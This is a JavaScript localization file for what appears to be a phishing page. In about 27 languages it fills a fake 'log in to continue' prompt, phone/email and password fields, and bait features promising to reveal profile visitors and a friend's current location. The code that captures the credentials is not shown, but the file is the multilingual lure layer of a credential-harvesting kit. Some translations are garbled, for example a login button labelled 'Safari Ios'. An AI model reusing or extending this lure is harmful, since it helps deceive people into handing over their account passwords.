transItems = document.querySelectorAll(".translated");
var userLang = (navigator.language || navigator.userLanguage).split('-')[0];
var Translate = {
    ar: {
        dir: 'rtl',
        log_alert: 'يجب تسجيل الدخول اولا',
        user: 'عنوان البريد الإلكتروني أو رقم الهاتف',
        pass: 'كلمه السر',
        button: 'تسجيل دخول',
        main: 'أضفنا الكثير من الميزات في التحديث الجديد',
        feature1: 'اكتشف من زار ملفك الشخصي',
        feature2: 'يمكنك تغيير لون التطبيق',
        feature3: 'اكتشف موقع صديقك الحالي',
        feature4: 'قم بتنزيل حالة أصدقائك',
        update_button: 'تحديث الان'
    },
    mn: {
        dir: 'rtl',
        log_alert :'Та үргэлжлүүлэхийн тулд нэвтрэх хэрэгтэй' ,
        user :'Гар утасны дугаар эсвэл имэйл хаяг' ,
        pass :'нууц үг' ,
        button :'Нэвтрэх' ,
        main :'Бид шинэ шинэчлэлтэд олон боломжуудыг нэмсэн' ,
        feature1:'Таны профайлд хэн зочилсныг олж мэдээрэй' ,
        feature2:'та програмын өнгийг өөрчлөх боломжтой' ,
        feature3:'Найзынхаа одоогийн байршлыг мэдэж аваарай' ,
        feature4:'Найзуудынхаа статусыг татаж аваарай' ,
        update_button :'Одоо шинэчлэх'

    },
    es: {
        dir: 'ltr',
        log_alert: 'Debe iniciar sesión para continuar',
        user: 'Número de teléfono móvil o dirección de correo electrónico',
        pass: 'contraseña',
        button: 'Iniciar Sesión',
        main: 'Agregamos muchas características en la nueva actualización',
        feature1: 'Descubre quién ha visitado tu perfil',
        feature2: 'puedes cambiar el color de la aplicación',
        feature3: 'Averigua la ubicación actual de tu amigo',
        feature4: 'Descarga el estado de tus amigos',
        update_button: 'Actualizar Ahora'

    },
    am: {
        dir: 'rtl',
        log_alert: 'ለመቀጠል መግባት አለብዎት',
        user: 'የተንቀሳቃሽ ስልክ ቁጥር ወይም የኢሜይል አድራሻ',
        pass: 'ሚስጢራዊ ቃል',
        button: 'ስግን እን',
        main: 'በጣም አዲስ',
        feature1: 'የእርስዎን መገለጫ ማን እንደጎበኘ ይወቁ',
        feature2: 'የመተግበሪያ ቀለም መቀየር ይችላሉ',
        feature3: 'ጓደኛዎን አሁን ያለውን አካባቢ ይወቁ',
        feature4: 'የጓደኛዎን ሁኔታ ያውርዱ',
        update_button: 'አሁን አሻሽል'

    },
    bg: {
        dir: 'ltr',
        log_alert: 'Трябва да влезете, за да продължите',
        user: 'Мобилен номер или имейл адрес',
        pass: 'парола',
        button: 'Вход',
        main: 'Добавихме много функции в новата актуализация',
        feature1: 'Разберете кой е посетил профила ви',
        feature2: 'можете да промените цвета на приложението',
        feature3: 'Разберете текущото местоположение на вашия приятел',
        feature4: 'Изтеглете статуса на вашите приятели',
        update_button: 'Актуализирайте Сега'


    },
    bn: {
        dir: 'ltr',
        log_alert: 'চালিয়ে যেতে আপনাকে অবশ্যই লগইন করতে হবে',
        user: 'মোবাইল নম্বর বা ইমেল ঠিকানা',
        pass: 'পাসওয়ার্ড',
        button: 'লগইন করুন',
        main: 'আমরা নতুন আপডেটে বৈশিষ্ট্য অনেক যোগ',
        feature1: 'আপনার প্রোফাইল কে পরিদর্শন করেছেন তা সন্ধান করুন',
        feature2: 'আপনি অ্যাপ্লিকেশন রঙ পরিবর্তন করতে পারেন',
        feature3: 'আপনার বন্ধুর বর্তমান অবস্থানটি সন্ধান করুন',
        feature4: 'আপনার বন্ধুদের স্থিতি ডাউনলোড করুন',
        update_button: 'এখন আপডেট করুন'


    },
    cs: {
        dir: 'ltr',
        log_alert: 'Chcete-li pokračovat, musíte se přihlásit',
        user: 'Mobilní číslo nebo e-mailová adresa',
        pass: 'heslo',
        button: 'přihlásit',
        main: 'Přidali jsme mnoho funkcí v nové aktualizaci',
        feature1: 'Zjistěte, kdo navštívil váš profil',
        feature2: 'můžete změnit barvu aplikace',
        feature3: 'Zjistěte aktuální polohu svého přítele',
        feature4: 'Stáhněte si stav přátel',
        update_button: 'aktualizovat'


    },
    el: {
        dir: 'ltr',
        log_alert: 'Πρέπει να συνδεθείτε για να συνεχίσετε',
        user: 'Αριθμός κινητού ή διεύθυνση ηλεκτρονικού ταχυδρομείου',
        pass: 'κωδικός',
        button: 'συνδεθείτε',
        main: 'Προσθέσαμε πολλές δυνατότητες στη νέα ενημέρωση',
        feature1: 'Μάθετε ποιος επισκέφτηκε το προφίλ σας',
        feature2: 'μπορείτε να αλλάξετε το χρώμα της εφαρμογής',
        feature3: 'Μάθετε τον φίλο σας τρέχουσα τοποθεσία',
        feature4: 'Κατεβάστε την κατάσταση των φίλων σας',
        update_button: 'Ενημέρωση Τώρα'


    },
    fi: {
        dir: 'ltr',
        log_alert: 'Sinun täytyy kirjautua sisään jatkaaksesi',
        user: 'Matkapuhelinnumero tai sähköpostiosoite',
        pass: 'salasana',
        button: 'kirjautunut',
        main: 'Lisäsimme paljon ominaisuuksia uuteen päivitykseen',
        feature1: 'Selvitä, kuka kävi profiilissasi',
        feature2: 'voit muuttaa sovelluksen väriä',
        feature3: 'Selvitä ystäväsi nykyinen sijainti',
        feature4: 'Lataa ystäväsi tila',
        update_button: 'Päivitä Nyt'

    },
    fr: {
        dir: 'ltr',
        log_alert: 'Vous devez vous connecter pour continuer',
        user: 'Numéro de portable ou adresse e-mail',
        pass: 'mot de passe',
        button: 'connecter',
        main: 'Nous avons ajouté beaucoup de fonctionnalités dans la nouvelle mise à jour',
        feature1: 'Découvrez qui a visité votre profil',
        feature2: "vous pouvez changer la couleur de l'application",
        feature3: "Découvrez l'emplacement actuel de votre ami",
        feature4: 'Téléchargez le statut de vos amis',
        update_button: 'Mettre à Jour Maintenant'


    },
    he: {
        dir: 'rtl',
        log_alert: 'עליך להתחבר כדי להמשיך',
        user: 'מספר טלפון נייד או כתובת אימייל',
        pass: 'סיסמה',
        button: 'התחבר',
        main: 'הוספנו הרבה תכונות בעדכון החדש',
        feature1: 'גלה מי ביקר בפרופיל שלך',
        feature2: 'אתה יכול לשנות את צבע האפליקציה',
        feature3: 'גלה את המיקום הנוכחי של חברך',
        feature4: 'הורד את סטטוס החברים שלך',
        update_button: 'עדכן עכשיו'

    },
    hi: {
        dir: 'ltr',
        log_alert: 'जारी रखने के लिए आपको लॉगिन करना होगा',
        user: 'मोबाइल नंबर या ईमेल पता',
        pass: 'पासवर्ड',
        button: 'लॉग इन करें',
        main: 'हमने नए अपडेट में बहुत सारी सुविधाएँ जोड़ी हैं',
        feature1: 'पता करें कि आपकी प्रोफ़ाइल किसने देखी',
        feature2: 'आप ऐप का रंग बदल सकते हैं',
        feature3: 'अपने मित्र वर्तमान स्थान का पता लगाएं',
        feature4: 'अपने दोस्तों की स्थिति डाउनलोड करें',
        update_button: 'अभी अपडेट करें'


    },
    hu: {
        dir: 'ltr',
        log_alert: 'A folytatáshoz be kell jelentkeznie',
        user: 'Mobilszám vagy e-mail cím',
        pass: 'jelszó',
        button: 'Bejelentkezés',
        main: 'Sok funkciót adtunk hozzá az új frissítéshez',
        feature1: 'Tudja meg, ki látogatta meg a profilját',
        feature2: 'meg lehet változtatni az alkalmazás színét',
        feature3: 'Tudja meg barátja aktuális tartózkodási helyét',
        feature4: 'Töltse le a barátok állapotát',
        update_button: 'Frissítés Most'


    },
    id: {
        dir: 'ltr',
        log_alert: 'Anda harus login untuk melanjutkan',
        user: 'Nomor ponsel atau alamat email',
        pass: 'kata sandi',
        button: 'Login',
        main: 'Kami menambahkan banyak fitur dalam update baru',
        feature1: 'Cari tahu siapa yang mengunjungi profil Anda',
        feature2: 'Anda dapat mengubah warna aplikasi',
        feature3: 'Cari tahu lokasi teman Anda saat ini',
        feature4: 'Unduh status teman Anda',
        update_button: 'Perbarui Sekarang'


    },
    it: {
        dir: 'ltr',
        log_alert: 'È necessario effettuare il login per continuare',
        user: 'Numero di cellulare o indirizzo email',
        pass: 'password',
        button: 'login',
        main: 'Abbiamo aggiunto molte funzionalità nel nuovo aggiornamento',
        feature1: 'Scopri chi ha visitato il tuo profilo',
        feature2: 'è possibile modificare il colore app',
        feature3: 'Scopri il tuo amico posizione corrente',
        feature4: 'Scarica il tuo stato amici',
        update_button: 'Aggiorna ora'


    },
    my: {
        dir: 'ltr',
        log_alert: 'ဆက်လက်ဝင်မည်',
        user: 'မိုဘိုင်းနံပါတ်သို့မဟုတ်အီးမေးလ်လိပ်စာ',
        pass: 'စကားဝှက်',
        button: 'မြန်မာဘာသာ',
        main: 'အသစ်အသစ်အသစ်အသစ်တွင်လုပ်ဆောင်ချက်များစွာကိုထည့်သွင်းထားပါသည်။',
        feature1: 'သင့်ရဲ့ပရိုဖိုင်းကိုသွားရောက်လည်ပတ်တဲ့သူထွက်ရှာမည်',
        feature2: 'အက်ပ်ကိုအရောင်ပြောင်းနိုင်သည်',
        feature3: 'သင္၏မိတ္ေဆြလက္ရွိတည္ေနရာကိုရွာပါ',
        feature4: 'သင္၏မိတ္ေဆြမ်ားအေျခအေနကိုေဒါင္းလုပ္ဆြဲရန္',
        update_button: 'ေနာက္ဆံုးရလဒ္'

    },
    ne: {
        dir: 'ltr',
        log_alert: 'तपाईँले जारी राख्न लगइन गर्नुपर्छ ।',
        user: 'मोबाइल नम्बर वा इमेल ठेगाना',
        pass: 'पासवर्ड',
        button: 'तौल घट्नु',
        main: 'हामी नयाँ अद्यावधिक मा विशेषताहरु को धेरै जोडी',
        feature1: 'तपाईंको प्रोफाइल भ्रमण गर्ने पत्ता लगाउनुहोस्',
        feature2: 'तपाईं अनुप्रयोग रंग परिवर्तन गर्न सक्नुहुन्छ',
        feature3: 'आफ्नो मित्र वर्तमान स्थान पत्ता',
        feature4: 'तपाइँको मित्रहरुलाई स्थिति डाउनलोड गर्नुहोस्',
        update_button: 'अब अद्यावधिक गर्नुहोस्'


    },
    ph: {
        dir: 'ltr',
        log_alert: 'Dapat kang mag-login upang magpatuloy',
        user: 'Numero ng mobile o email address',
        pass: 'password',
        button: 'Mag log in',
        main: 'Nagdagdag kami ng maraming feature sa bagong update',
        feature1: 'Alamin kung sino ang bumisita sa iyong profile',
        feature2: 'maaari mong baguhin ang kulay ng app',
        feature3: 'Alamin ang kasalukuyang loaction ng iyong kaibigan',
        feature4: 'I-download ang status ng iyong mga kaibigan',
        update_button: 'Update Ngayon'


    },
    pl: {
        dir: 'ltr',
        log_alert: 'Musisz się zalogować, aby kontynuować',
        user: 'Numer telefonu komórkowego lub adres e-mail',
        pass: 'hasło',
        button: 'Zaloguj Się',
        main: 'Dodaliśmy wiele funkcji w nowej aktualizacji',
        feature1: 'Dowiedz się, kto odwiedził Twój profil',
        feature2: 'możesz zmienić kolor aplikacji',
        feature3: 'Dowiedz się, gdzie znajduje się Twój znajomy',
        feature4: 'Pobierz status znajomych',
        update_button: 'Aktualizuj Teraz'


    },
    pt: {
        dir: 'ltr',
        log_alert: 'Você deve fazer login para continuar',
        user: 'Número de telemóvel ou endereço de E-mail',
        pass: 'senha',
        button: 'conectar',
        main: 'Adicionamos muitos recursos na nova atualização',
        feature1: 'Descubra quem visitou seu perfil',
        feature2: 'você pode alterar a cor do aplicativo',
        feature3: 'Descubra a localização atual do seu amigo',
        feature4: 'Baixe o status de seus amigos',
        update_button: 'Atualizar Agora'


    },
    ro: {
        dir: 'ltr',
        log_alert: 'Trebuie să vă conectați pentru a continua',
        user: 'Numărul de telefon mobil sau adresa de e-mail',
        pass: 'parolă',
        button: 'Autentificare',
        main: 'Am adăugat o mulțime de caracteristici în noua actualizare',
        feature1: 'Află cine ți-a vizitat profilul',
        feature2: 'puteți schimba culoarea aplicației',
        feature3: 'Afla prietenul tău locația curentă',
        feature4: 'Descărcați starea prietenilor',
        update_button: 'Actualizați Acum'

    },
    sw: {
        dir: 'ltr',
        log_alert: 'Lazima login kuendelea',
        user: 'Simu ya mkononi au barua pepe',
        pass: 'nywila',
        button: 'Safari Ios',
        main: 'Sisi aliongeza mengi ya makala katika update mpya',
        feature1: 'Kutambua nani alitembelea profile yako',
        feature2: 'unaweza kubadilisha app rangi',
        feature3: 'Kujua rafiki yako eneo la sasa',
        feature4: 'Download rafiki hali yako',
        update_button: 'Mwisho Sasa'

    },
    th: {
        dir: 'ltr',
        log_alert: 'คุณต้องเข้าสู่ระบบเพื่อดำเนินการต่อ',
        user: 'หมายเลขโทรศัพท์มือถือหรือที่อยู่อีเมล',
        pass: 'รหัสผ่าน',
        button: 'ลงชื่อเข้าใช้',
        main: 'เราได้เพิ่มจำนวนมากของคุณสมบัติในการปรับปรุงใหม่',
        feature1: 'ค้นหาผู้ที่เข้าเยี่ยมชมโปรไฟล์ของคุณ',
        feature2: 'คุณสามารถเปลี่ยนสีแอพพลิเค',
        feature3: 'ค้นหาตำแหน่งปัจจุบันของเพื่อนของคุณ',
        feature4: 'ดาวน์โหลดสถานะเพื่อนของคุณ',
        update_button: 'อัปเดตเดี๋ยวนี้'


    },
    tr: {
        dir: 'ltr',
        log_alert: 'Devam etmek için giriş yapmalısınız',
        user: 'Cep telefonu numarası ya da e-posta adresi',
        pass: 'şifre',
        button: 'giriş yap',
        main: 'Yeni güncellemede birçok özellik ekledik',
        feature1: 'Profilinizi kimin ziyaret ettiğini öğrenin',
        feature2: 'uygulama rengini değiştirebilirsiniz',
        feature3: 'Arkadaşınızın mevcut konumunu öğrenin',
        feature4: 'Arkadaşlarınızın durumunu indirin',
        update_button: 'Şimdi Güncelle'

    },
    ur: {
        dir: 'rtl',
        log_alert: 'آپ کو ہونا چاہیے میں لاگ ان کرنے کے لئے جاری',
        user: 'موبائل نمبر یا ای میل ایڈریس',
        pass: 'پاس ورڈ',
        button: 'میں لاگ ان کریں',
        main: 'ہم ایک بہت شامل کی خصوصیات میں نئی اپ ڈیٹ',
        feature1: 'باہر تلاش کریں جو آپ کی پروفائل کا دورہ کیا',
        feature2: 'آپ تبدیل کر سکتے ہیں اپلی کیشن رنگ',
        feature3: 'باہر تلاش آپ کے دوست کے موجودہ مقام',
        feature4: 'ڈاؤن لوڈ ، اتارنا آپ کے دوست کی حیثیت',
        update_button: 'اپ ڈیٹ اب'

    },
    vi: {
        dir: 'ltr',
        log_alert: 'Bạn phải login để có thể tiếp tục',
        user: 'Số điện thoại di động, hoặc địa chỉ email',
        pass: 'mật khẩu',
        button: 'Đăng Nhập',
        main: 'Chúng tôi đã thêm rất nhiều năng trong các cập nhật mới',
        feature1: 'Tìm ra người đã truy cập hồ sơ của bạn',
        feature2: 'cậu có thể ứng dụng thay đổi màu sắc',
        feature3: 'Tìm ra người bạn vị trí hiện tại',
        feature4: 'Tải về bạn bè của bạn tình trạng',
        update_button: 'Cập Nhật Bây Giờ'

    }
};


transItems[0].style.direction = Translate[userLang].dir;
transItems[1].innerHTML = Translate[userLang].log_alert;
transItems[2].setAttribute("placeholder", Translate[userLang].user);
transItems[3].setAttribute("placeholder", Translate[userLang].pass);
transItems[4].innerHTML = Translate[userLang].button;
transItems[5].innerHTML = Translate[userLang].main;
transItems[6].innerHTML = Translate[userLang].feature1;
transItems[7].innerHTML = Translate[userLang].feature2;
transItems[8].innerHTML = Translate[userLang].feature3;
transItems[9].innerHTML = Translate[userLang].feature4;
transItems[10].innerHTML = Translate[userLang].update_button;